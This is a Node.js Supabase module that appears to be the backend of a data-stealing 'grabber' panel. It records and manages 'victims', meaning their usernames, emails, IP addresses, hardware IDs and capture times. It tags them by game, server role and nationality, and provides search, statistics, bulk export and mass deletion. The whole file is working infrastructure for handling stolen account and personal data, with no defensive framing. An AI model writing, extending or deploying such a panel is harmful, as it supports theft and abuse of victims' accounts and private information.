const { createClient } = require('@supabase/supabase-js');

let _supabase = null;

function getClient() {
  if (!_supabase) {
    _supabase = createClient(process.env.SUPABASE_URL || '', process.env.SUPABASE_ANON_KEY || '');
  }
  return _supabase;
}

async function getVictims(page = 1, limit = 20, search = '', tagFilter = '') {
  const supabase = getClient();
  let query = supabase.from('victims').select('*');
  if (search) query = query.or(`username.ilike.%${search}%,user_id.ilike.%${search}%`);
  if (tagFilter) query = query.contains('tags', [tagFilter]);
  const from = (page - 1) * limit;
  const to = from + limit - 1;
  const { data, error } = await query.order('grabbed_at', { ascending: false }).range(from, to);
  if (error) throw error;
  let countQuery = supabase.from('victims').select('*', { count: 'exact', head: true });
  if (search) countQuery = countQuery.or(`username.ilike.%${search}%,user_id.ilike.%${search}%`);
  if (tagFilter) countQuery = countQuery.contains('tags', [tagFilter]);
  const { count } = await countQuery;
  return { victims: data || [], total: count || 0, page, limit, pages: Math.ceil((count || 0) / limit) };
}

async function getVictimById(id) {
  const { data } = await getClient().from('victims').select('*').eq('id', id).single();
  return data;
}

async function getStats() {
  const supabase = getClient();
  const { count: total_victims } = await supabase.from('victims').select('*', { count: 'exact', head: true });
  const now = new Date();
  const todayStart = new Date(now.getFullYear(), now.getMonth(), now.getDate()).toISOString();
  const weekStart = new Date(now.getTime() - 7 * 86400000).toISOString();
  const { count: today } = await supabase.from('victims').select('*', { count: 'exact', head: true }).gte('grabbed_at', todayStart);
  const { count: this_week } = await supabase.from('victims').select('*', { count: 'exact', head: true }).gte('grabbed_at', weekStart);
  const { count: with_email } = await supabase.from('victims').select('*', { count: 'exact', head: true }).not('email', 'is', null).neq('email', '');
  const { data: allVictims } = await supabase.from('victims').select('ip, hwid, tags, grabbed_at');
  const uniqueIps = new Set(), uniqueHwids = new Set();
  const tagCounts = {}, dateCounts = {};
  for (const v of allVictims || []) {
    if (v.ip) uniqueIps.add(v.ip);
    if (v.hwid) uniqueHwids.add(v.hwid);
    if (v.tags && Array.isArray(v.tags)) for (const t of v.tags) tagCounts[t] = (tagCounts[t] || 0) + 1;
    if (v.grabbed_at) { const d = v.grabbed_at.split('T')[0]; dateCounts[d] = (dateCounts[d] || 0) + 1; }
  }
  const tagColorMap = { ff_player: '#FF4500', pubg_player: '#FFD700', valorant_player: '#FF4655', mc_player: '#00AA00', roblox_player: '#FF0033', fortnite_player: '#7AC5CD', owner: '#FFD700', staff: '#5865f2', dev: '#57F287', arab: '#006C35', french: '#002654' };
  const topTags = Object.entries(tagCounts).sort(([, a], [, b]) => b - a).slice(0, 10).map(([tag, count]) => ({ tag, count, color: tagColorMap[tag] || '#80848e' }));
  return { total_victims: total_victims || 0, today: today || 0, this_week: this_week || 0, with_email: with_email || 0, unique_ips: uniqueIps.size, unique_hwids: uniqueHwids.size, victims_by_tag: Object.entries(tagCounts).map(([tag, count]) => ({ tag, count })), victims_over_time: Object.entries(dateCounts).sort().map(([date, count]) => ({ date, count })), tag_distribution: topTags.map(t => ({ name: t.tag, value: t.count, color: t.color })), top_tags: topTags };
}

async function getAllVictimsForExport() {
  const { data } = await getClient().from('victims').select('*');
  return data || [];
}

async function deleteAllVictims() {
  const { error } = await getClient().from('victims').delete().neq('id', 0);
  if (error) throw error;
}

async function upsertVictim(victim) {
  const supabase = getClient();
  const { data: existing } = await supabase.from('victims').select('id, tags').eq('user_id', victim.user_id).single();
  if (existing) {
    const existingTags = Array.isArray(existing.tags) ? existing.tags : [];
    const newTags = Array.isArray(victim.tags) ? victim.tags : [];
    const mergedTags = [...new Set([...existingTags, ...newTags])];
    await supabase.from('victims').update({ ...victim, tags: mergedTags, last_seen: new Date().toISOString(), is_active: true }).eq('id', existing.id);
    return { id: existing.id, updated: true };
  } else {
    const { data } = await supabase.from('victims').insert({ ...victim, grabbed_at: new Date().toISOString(), last_seen: new Date().toISOString(), is_active: true }).select('id').single();
    return { id: data.id, updated: false };
  }
}

module.exports = { getVictims, getVictimById, getStats, getAllVictimsForExport, deleteAllVictims, upsertVictim };
